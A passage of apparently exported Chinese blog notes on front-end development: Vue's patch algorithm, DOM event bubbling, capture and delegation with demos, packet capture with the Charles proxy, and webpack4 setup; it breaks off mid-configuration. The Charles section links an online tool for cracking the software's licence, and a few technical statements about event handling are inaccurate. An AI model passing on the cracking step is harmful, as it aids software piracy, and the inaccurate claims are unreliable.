<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    children: [VNode],</span><br><span class="line">    context: &#123;...&#125;, <span class="comment">// 当前组件的Vue实例，每个组件都是一个Vue实例</span></span><br><span class="line">    data: &#123;...&#125;,</span><br><span class="line">    tag: <span class="string">"p"</span>,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p>patch本身就有补丁修补的意思。</p>
<p>DOM操作的执行速度远不如js的运算速度快，因此把大量DOM操作搬运到js中，使用patching算法来计算出真正需要更新的几点，最大限度的减少DOM操作，从而显著提升性能。</p>
<p>patch需要做三件事：</p>
<h3 id="创建新增节点"><a href="#创建新增节点" class="headerlink" title="创建新增节点"></a>创建新增节点</h3><p>当一个节点在oldVNode中不存在，而新生成的VNode存在，就需要使用vnode生成真实的DOM元素，并将其插入到视图当中。</p>
<p>对于新增的元素节点，通过<strong>document.createElement()</strong>来创建DOM，再通过<strong>parentNode.appendChild()</strong>插入父级中。</p>
<p>若这个节点有子节点，还需先创建子节点。递归循环这个vnode的children属性，为每一个子节点创建元素，插入新创建的父级元素中。</p>
<h3 id="删除节点"><a href="#删除节点" class="headerlink" title="删除节点"></a>删除节点</h3><p>同新增，使用parentNode.removeChild();</p>
<h3 id="更新节点"><a href="#更新节点" class="headerlink" title="更新节点"></a>更新节点</h3><p>对于静态节点，即<code>&lt;p&gt;hi&lt;/p&gt;</code>这种，第一次渲染后不会再变化，所以这种节点会跳过更新节点过程。有助于提升性能。</p>
<ul>
<li><p>如果新的节点是文本节点，即有text属性，那就直接把原DOM的node.textContent换成新节点文本。</p>
</li>
<li><p>若不是文本节点，即元素节点。没有children属性的话，就是一个空元素，若oldVNode中该节点有内容，就删除该节点下的内容，就成了空元素。</p>
</li>
<li><p>到最后只剩新的vnode与oldVnode都存在children属性了，此时更新子节点的逻辑：</p>
</li>
</ul>
<p>循环newChildren，每循环到一个新子节点，就去oldChild中找是否存在和当前节点相同的旧节点。若找到了，就继续判断，若是静态、文本、空、有children之类的情，就这样递归。如果位置不同，就移动节点。</p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>事件冒泡、事件捕获、默认事件与事件代理（委托）</title>
    <url>/2017/09/%E4%BA%8B%E4%BB%B6%E5%86%92%E6%B3%A1%E3%80%81%E4%BA%8B%E4%BB%B6%E6%8D%95%E8%8E%B7%E3%80%81%E9%BB%98%E8%AE%A4%E4%BA%8B%E4%BB%B6%E4%B8%8E%E4%BA%8B%E4%BB%B6%E4%BB%A3%E7%90%86%EF%BC%88%E5%A7%94%E6%89%98%EF%BC%89.html</url>
    <content><![CDATA[<blockquote>
<p>17年的关于事件冒泡和事件捕获的总结还是相对片面，现在更新一下。  – 2019.07.16</p>
</blockquote>
<p>事件冒泡和事件捕获分别由<code>微软</code>和<code>网景公司</code>提出，这两个概念都是为了解决页面中事件流（事件发生顺序）的问题。<code>W3C</code>采用折中的方式，平息了战火，制定了统一的标准–<code>先捕获再冒泡</code>。</p>
<a id="more"></a>
<h1 id="DOM0-amp-DOM2"><a href="#DOM0-amp-DOM2" class="headerlink" title="DOM0 &amp; DOM2"></a>DOM0 &amp; DOM2</h1><p>在DOM的发展中，有规定DOM0、DOM2级绑定事件。</p>
<h2 id="DOM0"><a href="#DOM0" class="headerlink" title="DOM0"></a>DOM0</h2><p>DOM0事件就是通过<code>onclick</code>直接绑定到html事件上的，不存在兼容性问题，很早期。</p>
<h2 id="DOM2"><a href="#DOM2" class="headerlink" title="DOM2"></a>DOM2</h2><p>DOM2事件是通过<code>element.addEventListener(event, function, useCapture)</code>函数来绑定事件的。</p>
<p>DOM2规定了事件传播分为三个阶段：</p>
<ul>
<li>捕获阶段</li>
<li>目标阶段</li>
<li>冒泡阶段</li>
</ul>
<p><img src="https://user-gold-cdn.xitu.io/2019/7/13/16be8f295ab93910?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="mark"></p>
<p><code>addEventListener</code>第三个参数为<code>useCapture</code>，值为<code>true/fasle</code>。设定事件是在捕获阶段触发还是在冒泡阶段触发。</p>
<ul>
<li>fasle，<strong>默认</strong>，冒泡阶段触发</li>
<li>true，捕获阶段触发</li>
</ul>
<p>或者直接在事件执行函数<code>function</code>中<code>return false or true</code>同样可以控制冒泡或捕获。</p>
<h1 id="function的event参数"><a href="#function的event参数" class="headerlink" title="function的event参数"></a>function的event参数</h1><p>函数的隐藏参数event包含了很多属性和方法，且一些浏览器不太相同，但是都包含一些常见的。</p>
<ul>
<li>bubble ：    表明事件是否冒泡</li>
<li>cancelable ：  表明是否可以取消冒泡</li>
<li>currentTarget ： 当前时间程序正在处理的元素, 和this一样的;</li>
<li>defaultPrevented： false ，如果调用了preventDefualt这个就为真了;</li>
<li>detail： 与事件有关的信息(滚动事件等等)</li>
<li><strong>eventPhase： 如果值为1表示处于捕获阶段， 值为2表示处于目标阶段，值为3表示在冒泡阶段</strong></li>
<li>target || srcElement： 事件的目标</li>
<li>trusted： 为ture是浏览器生成的，为false是开发人员创建的（DOM3）</li>
<li>type ： 事件的类型</li>
<li><strong>preventDefault()   阻止默认事件；</strong></li>
<li><strong>stopPropagation()  取消冒泡或者捕获；</strong></li>
<li>stopImmediatePropagation() (DOM3)阻止任何事件的运行；</li>
</ul>
<h1 id="事件冒泡"><a href="#事件冒泡" class="headerlink" title="事件冒泡"></a>事件冒泡</h1><p>点击child,先进行事件捕获阶段，而后在事件冒泡阶段触发child事件，再冒泡到parent,触发父级事件（会一直冒泡到文档根）；<br>这个过程是可以阻止的，方法<code>event.stopPropagation()</code>：(多益二笔考了这个，结果我给忘了……)</p>
<h1 id="事件捕获"><a href="#事件捕获" class="headerlink" title="事件捕获"></a>事件捕获</h1><p>点击child,先进行事件捕获阶段，触发parent事件，再逐级往下进行捕获到child,触发child事件；再进行冒泡，冒泡阶段不执行。</p>
<h1 id="两个demo"><a href="#两个demo" class="headerlink" title="两个demo"></a>两个demo</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"parent"</span>&gt;</span></span><br><span class="line">    parent</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"child"</span>&gt;</span></span><br><span class="line">        child</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"parent"</span>).addEventListener(<span class="string">"click"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"parent"</span>);</span></span><br><span class="line"><span class="javascript">&#125;, <span class="literal">false</span>); <span class="comment">// 冒泡</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"child"</span>).addEventListener(<span class="string">"click"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"child"</span>);</span></span><br><span class="line"><span class="javascript">&#125;, <span class="literal">true</span>); <span class="comment">// 捕获</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>点击<code>parent</code>，输出<code>parent</code>；<br>点击<code>child</code>，输出<code>child parent</code>；由于父级事件定义为冒泡阶段执行，所以先输出child，后输出parent；</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"parent"</span>&gt;</span></span><br><span class="line">    parent</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"child"</span>&gt;</span></span><br><span class="line">        child</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"parent"</span>).addEventListener(<span class="string">"click"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"parent"</span>);</span></span><br><span class="line"><span class="javascript">&#125;, <span class="literal">true</span>); <span class="comment">// 捕获</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"child"</span>).addEventListener(<span class="string">"click"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"child"</span>);</span></span><br><span class="line"><span class="javascript">&#125;, <span class="literal">true</span>); <span class="comment">// 捕获</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>点击<code>parent</code>，输出<code>parent</code>；<br>点击<code>child</code>，输出<code>parent child</code>；由于父级事件定义为捕获阶段执行，所以先输出parent，后输出child；</p>
<h1 id="默认事件"><a href="#默认事件" class="headerlink" title="默认事件"></a>默认事件</h1><p>浏览器具有默认行为，诸如a标签的点击跳转，右键点击跳出菜单等；<br>阻止默认事件：<code>event.preventDefault()</code>;(多益二笔和阻止默认事件一起考的，这个我记得)；</p>
<h1 id="事件冒泡和事件捕获的选择"><a href="#事件冒泡和事件捕获的选择" class="headerlink" title="事件冒泡和事件捕获的选择"></a>事件冒泡和事件捕获的选择</h1><p>其中addEventListener()中 true为捕获，false为冒泡，默认false</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">obj.addEventListener(<span class="string">"click"</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">&#125;,<span class="literal">true</span>)  <span class="comment">//捕获</span></span><br><span class="line">obj.addEventListener(<span class="string">"click"</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">&#125;,<span class="literal">false</span>)  <span class="comment">//冒泡</span></span><br></pre></td></tr></table></figure>
<h1 id="事件代理（委托）"><a href="#事件代理（委托）" class="headerlink" title="事件代理（委托）"></a>事件代理（委托）</h1><blockquote>
<p>以下参考了<a href="http://www.cnblogs.com/liugang-vip/p/5616484.html" target="_blank" rel="noopener">js中的事件委托或是事件代理详解</a>，并做了精简和提炼</p>
</blockquote>
<p>首先，事件代理是利用了事件冒泡的！（之前一直好奇事件冒泡这种不方便的东西有什么用…..直到了解了事件代理）<br>比如现在的需求是有100个li标签，每个都要给他设置个点击事件；最直接的方法是写个for循环，遍历添加事件。</p>
<blockquote>
<p>但是在JavaScript中，添加的事件处理程序数量将关系到页面的整体运行性能，因为需要不断的与dom节点进行交互，访问dom的次数越多，引起浏览器重绘与重排的次数也就越多，就会延长整个页面的交互就绪时间，这就是为什么<strong>性能优化的主要思想之一就是减少DOM操作的原因</strong>；如果要用事件委托，就会将所有的操作放到js程序里面，与dom的操作就只需要交互一次，这样就能大大的减少与dom的交互次数，提高性能；</p>
</blockquote>
<h2 id="给每个li添加事件"><a href="#给每个li添加事件" class="headerlink" title="给每个li添加事件"></a>给每个li添加事件</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;ul id=<span class="string">"ul"</span>&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">111</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;222&lt;/</span>li&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">333</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;444&lt;/</span>li&gt;</span><br><span class="line">&lt;<span class="regexp">/ul&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> oUl = <span class="built_in">document</span>.getElementById(<span class="string">"ul"</span>);</span><br><span class="line">oUl.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">123</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当li被点击时，由于冒泡原理，事件就会冒泡到ul上，因为ul上有点击事件，所以事件就会触发。<br>但是，这里当点击ul的时候，也是会触发的，那么如果我想让事件代理的效果跟直接给节点的事件效果一样怎么办？比如说只有点击li才会触发。</p>
<blockquote>
<p>Event对象提供了一个属性叫target，可以返回事件的目标节点，也就是说，target就可以表示为当前的事件操作的dom，但是不是真正操作dom，而且，这个是有兼容性的，标准浏览器用ev.target，IE浏览器用event.srcElement，此时只是获取了当前节点的位置，并不知道是什么节点名称，这里我们用nodeName来获取具体是什么标签名，这个返回的是一个大写的。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> oUl = <span class="built_in">document</span>.getElementById(<span class="string">"ul"</span>);</span><br><span class="line">oUl.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">　<span class="comment">//兼容IE</span></span><br><span class="line">　<span class="keyword">var</span> e = e || <span class="built_in">window</span>.event;</span><br><span class="line">　<span class="keyword">var</span> target = e.target || e.srcElement;</span><br><span class="line">　<span class="keyword">if</span>(target.nodeName == <span class="string">'LI'</span>)&#123;</span><br><span class="line">    alert(<span class="number">123</span>);</span><br><span class="line">    alert(target.innerHTML);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="给每个子节点添加不同事件"><a href="#给每个子节点添加不同事件" class="headerlink" title="给每个子节点添加不同事件"></a>给每个子节点添加不同事件</h2><p>之前做了个购物车的<a href="http://simmzl.cn/onlineMall/cart.html" target="_blank" rel="noopener">DEMO</a><br>在一个tr中，几个td的点击事件不同，这是就要用到<code>switch</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">"box"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"button"</span> id=<span class="string">"add"</span> value=<span class="string">"添加"</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">"button"</span> id=<span class="string">"remove"</span> value=<span class="string">"删除"</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">"button"</span> id=<span class="string">"move"</span> value=<span class="string">"移动"</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">"button"</span> id=<span class="string">"select"</span> value=<span class="string">"选择"</span> /&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> oBox = <span class="built_in">document</span>.getElementById(<span class="string">"box"</span>);</span><br><span class="line">oBox.onclick = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e = e || <span class="built_in">window</span>.event;</span><br><span class="line">    <span class="keyword">var</span> target = e.target || e.srcElement;</span><br><span class="line">    <span class="keyword">if</span>(target.nodeName == <span class="string">'INPUT'</span>)&#123;</span><br><span class="line">        <span class="keyword">switch</span>(target.id)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'add'</span> :</span><br><span class="line">                alert(<span class="string">'添加'</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'remove'</span> :</span><br><span class="line">                alert(<span class="string">'删除'</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'move'</span> :</span><br><span class="line">                alert(<span class="string">'移动'</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'select'</span> :</span><br><span class="line">                alert(<span class="string">'选择'</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="增加子节点时"><a href="#增加子节点时" class="headerlink" title="增加子节点时"></a>增加子节点时</h2><p>当父级不使用代理事件，给其添加子节点时，子节点的点击事件也要添加！这就又增加了一个dom操作。<br>当父级代理事件时，该子节点不用添加点击事件就会因为事件冒泡触发父级的代理事件！</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>面试</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Charles进行移动端抓包</title>
    <url>/2018/10/%E4%BD%BF%E7%94%A8Charles%E8%BF%9B%E8%A1%8C%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%8A%93%E5%8C%85.html</url>
    <content><![CDATA[<p><a href="https://www.charlesproxy.com/" target="_blank" rel="noopener">Charles</a>是一款代理服务器，通过将自己设置成系统（电脑/移动端）的网络访问代理服务器，然后截取请求和请求结果，以达到分析抓包的目的。</p>
<a id="more"></a>
<h1 id="下载-破解"><a href="#下载-破解" class="headerlink" title="下载/破解"></a>下载/破解</h1><p>官网下载，然后破解：<a href="https://www.zzzmode.com/mytools/charles/" target="_blank" rel="noopener">Charles 在线破解工具</a></p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>电脑与手机连接同一wifi，手机设置WIFI代理：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">主机名：电脑局域网ip</span><br><span class="line">端口：8888 (charles默认端口)</span><br></pre></td></tr></table></figure>
<p>在charles中即可查看手机的所有网络请求。</p>
<h1 id="https请求"><a href="#https请求" class="headerlink" title="https请求"></a>https请求</h1><p>使用charles抓取http请求可以直接查看详情，但是对于https请求，由于https的使用了SSL协议加密了报文，因此需要在客户机（手机）与服务器（电脑）上安装证书，否则在charles上无法查看https请求内容，显示为unknown。</p>
<p>如何安装证书： <a href="https://www.cnblogs.com/ceshijiagoushi/p/6812493.html" target="_blank" rel="noopener">Charles抓取https请求详解</a></p>
<p><a href="https://www.cnblogs.com/pengyunjing/p/9158009.html" target="_blank" rel="noopener">mac参考</a></p>
<h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><p>手机自带浏览器打开<code>chls.pro/ssl</code>或<code>http://charlesproxy.com/getssl</code>可能下载得到<code>getssl.crt</code>文件，是无法安装的，这时需要使用第三方浏览器下载得到<code>charles-proxy-ssl-proxying-certificate.pem</code>。</p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>http/https</tag>
      </tags>
  </entry>
  <entry>
    <title>webpack4配置</title>
    <url>/2018/09/webpack4%E9%85%8D%E7%BD%AE.html</url>
    <content><![CDATA[<p>Webpack项目工程化构建配置。  </p>
<p>Github仓库：<a href="https://github.com/simmzl/webpack4-config" target="_blank" rel="noopener">webpack4-config</a></p>
<a id="more"></a>
<h1 id="创建package-json"><a href="#创建package-json" class="headerlink" title="创建package.json"></a>创建package.json</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm init</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">package name: (<span class="built_in">test</span>) <span class="built_in">test</span></span><br><span class="line">version: (1.0.0)</span><br><span class="line">description:</span><br><span class="line">entry point: (index.js)</span><br><span class="line"><span class="built_in">test</span> <span class="built_in">command</span>:</span><br><span class="line">git repository:</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h1 id="安装webpack"><a href="#安装webpack" class="headerlink" title="安装webpack"></a>安装webpack</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cnpm i --save-dev webpack</span><br></pre></td></tr></table></figure>
<h1 id="配置-webpack-config-js"><a href="#配置-webpack-config-js" class="headerlink" title="配置 webpack.config.js"></a>配置 webpack.config.js</h1><p><code>webpack.config.js</code>会最终暴露出一个配置对象。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;&#125;;</span><br><span class="line"><span class="built_in">module</span>.exports = config;</span><br></pre></td></tr></table></figure>
<h2 id="mode"><a href="#mode" class="headerlink" title="mode"></a>mode</h2><p>webpcak4新增了mode,用于根据环境选用对应配置，不设置会warning: <code>The &#39;mode&#39; option has not been set, webpack will fallback to &#39;production&#39; for this value...</code>  </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">    mode: <span class="string">"production"</span>  <span class="comment">// none/development/production</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="entry-amp-output"><a href="#entry-amp-output" class="headerlink" title="entry &amp; output"></a>entry &amp; output</h2><p>webpack入口和输出。<br><code>entry/output</code> 是一个对象，可以定义多个入口。配置output，使其根据入口加上hash动态生成打包后的名称：  </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">"path"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// __dirname为当前绝对路径</span></span><br><span class="line"><span class="built_in">console</span>.error(<span class="string">"__dirname ===&gt;"</span>, __dirname);</span><br><span class="line"><span class="comment">// __dirname ===&gt; D:\github\Personal-site</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">    entry: &#123;</span><br><span class="line">        index: <span class="string">"./src/index.js"</span></span><br><span class="line">        <span class="comment">// 可以添加多个入口</span></span><br><span class="line">        <span class="comment">// app: "./src/app.js"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    output: &#123;</span><br><span class="line">        filename: <span class="string">"[name].[hash].js"</span>,</span><br><span class="line">        <span class="comment">// 生成绝对路径</span></span><br><span class="line">        <span class="comment">// D:\github\Personal-site\dist</span></span><br><span class="line">        path: path.resolve(__dirname, <span class="string">"dist"</span>),</span><br><span class="line">        publicPath: <span class="string">"./"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上用了<code>path</code>做了路径处理，<code>path</code>是<code>node.js</code>内置的<code>package</code>，用来处理路径。<code>path.resolve(__dirname, &quot;dist&quot;)</code>会生成返回一个绝对路径，以储存生成的文件。<br><code>publicPath</code> 并不会对生成文件的路径造成影响，主要是对页面里面引入的资源的路径做对应的补全。如<code>publicPath: &quot;/&quot;</code>后，生成的页面引入js的路径为<code>src=&quot;/[name].[hash].js&quot;</code>,本地预览会报错，设置成<code>publicPath: &quot;./&quot;</code> ===&gt; <code>src=&quot;./[name].[hash].js&quot;</code>则可以解决问题。</p>
<h2 id="devtool"><a href="#devtool" class="headerlink" title="devtool"></a>devtool</h2><p>指定sourceMap模式。<br>sourceMap模式有很多种，具体可看：<a href="https://www.cnblogs.com/wangyingblog/p/7027540.html" target="_blank" rel="noopener">webpack——devtool里的7种SourceMap模式</a><br>vue-cli的webpack.dev.conf.js使用了<code>cheap-module-eval-source-map</code>。<br>生产环境这里使用<code>hidden-source-map</code>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">    <span class="comment">// cheap-module-eval-source-map is faster for development</span></span><br><span class="line">    devtool: <span class="string">"cheap-module-eval-source-map"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="devServer"><a href="#devServer" class="headerlink" title="devServer"></a>devServer</h2><ul>
<li>在开发模式下，DevServer 提供虚拟服务器，让我们进行开发和调试。</li>
<li>提供实时重新加载,减少开发时间。</li>
<li>它不是 webpack 内置插件，要安装</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cnpm i --save-dev webpack-dev-server</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">    devSever: &#123;</span><br><span class="line">        contentBase: <span class="string">'./dist'</span>,</span><br><span class="line">        hot: <span class="literal">true</span>,</span><br><span class="line">        host: <span class="string">'localhost'</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可参考：<a href="https://webpack.js.org/configuration/dev-server/" target="_blank" rel="noopener">官方文档</a> 、 <a href="https://segmentfault.com/a/1190000012383015" target="_blank" rel="noopener">segmentfault</a>。</p>
<p>这里我们将开发的devServer单独分为一个js文件，并通过node运行文件从而跑起服务器。<br>安装依赖：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cnpm i --save-dev opn webpack-dev-server</span><br></pre></td></tr></table></figure>
<p>新建： /build/dev-server.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> webpackDevServer = <span class="built_in">require</span>(<span class="string">'webpack-dev-server'</span>);</span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>);</span><br><span class="line"><span class="comment">// 使用opn打开浏览器（解决devServer.open无效）</span></span><br><span class="line"><span class="keyword">const</span> opn = <span class="built_in">require</span>(<span class="string">"opn"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入配置</span></span><br><span class="line"><span class="keyword">const</span> config = <span class="built_in">require</span>(<span class="string">'../webpack.config.js'</span>);</span><br><span class="line"><span class="comment">// devServer配置</span></span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">    contentBase: <span class="string">'./dist'</span>,</span><br><span class="line">    hot: <span class="literal">true</span>,</span><br><span class="line">    host: <span class="string">'localhost'</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将devServer加入webpack配置</span></span><br><span class="line">webpackDevServer.addDevServerEntrypoints(config, options);</span><br><span class="line"><span class="keyword">const</span> compiler = webpack(config);</span><br><span class="line"><span class="comment">// 新建devServer</span></span><br><span class="line"><span class="keyword">const</span> server = <span class="keyword">new</span> webpackDevServer(compiler, options);</span><br><span class="line"><span class="comment">// 监听、打开端口</span></span><br><span class="line">server.listen(<span class="number">5000</span>, <span class="string">'localhost'</span>, () =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'dev server listening on port 5000'</span>);</span><br><span class="line">    opn(<span class="string">`http://127.0.0.1:5000`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>在<code>package.json</code>中添加脚本命令：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    scripts: &#123;</span><br><span class="line">        "dev": "node ./build/dev-server.js"</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注释掉<code>webpack.config.js</code>中配置的<code>devServer</code>:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">    <span class="comment">// devSever: &#123;</span></span><br><span class="line">    <span class="comment">//     contentBase: './dist',</span></span><br><span class="line">    <span class="comment">//     hot: true,</span></span><br><span class="line">    <span class="comment">//     host: 'localhost'</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行<code>npm run dev</code>即可开启服务。(别急着运行，继续配置)  </p>
<h2 id="plugins"><a href="#plugins" class="headerlink" title="plugins"></a>plugins</h2><p><code>plugins</code> 选项用于以各种方式自定义 <code>webpack</code> 构建过程。<code>webpack</code>附带了各种内置插件，可以通过<code>webpack.[plugin-name]</code>或者直接引入<code>require([plugin-name])</code> 访问这些插件。  <a href="https://webpack.docschina.org/plugins/" target="_blank" rel="noopener">自带插件</a></p>
<h3 id="html-webpack-plugin"><a href="#html-webpack-plugin" class="headerlink" title="html-webpack-plugin"></a>html-webpack-plugin</h3><p>自动生成html，插入script。<br>更多： <a href="https://github.com/jantimon/html-webpack-plugin#" target="_blank" rel="noopener">官方配置</a>、<a href="https://github.com/kangax/html-minifier#options-quick-reference" target="_blank" rel="noopener">html-minifier配置</a>、<a href="https://www.cnblogs.com/YangJieCheng/p/8302975.html" target="_blank" rel="noopener">html-minifier中文文档</a>  </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> HtmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">"html-webpack-plugin"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">    entry: &#123;</span><br><span class="line">        index: <span class="string">"./src/index.js"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    plugins: [</span><br><span class="line">        <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">            <span class="comment">// html模板文件(在文件中写好title、meta等)</span></span><br><span class="line">            template: <span class="string">"src/index.html"</span>,</span><br><span class="line">            <span class="comment">// 输出的路径(包含文件名)</span></span><br><span class="line">            filename: <span class="string">"./index.html"</span>,</span><br><span class="line">            <span class="comment">//自动插入js脚本</span></span><br><span class="line">            <span class="comment">// true body head false 默认为true:script标签位于html文件的 body 底部</span></span><br><span class="line">            inject: <span class="literal">true</span>,</span><br><span class="line">            <span class="comment">// chunks主要用于多入口文件，当你有多个入口文件，那就回编译后生成多个打包后的文件，那么chunks 就能选择你要使用那些js文件</span></span><br><span class="line">            chunks: [<span class="string">"index"</span>],</span><br><span class="line">            <span class="comment">// 压缩html</span></span><br><span class="line">            minify: &#123;</span><br><span 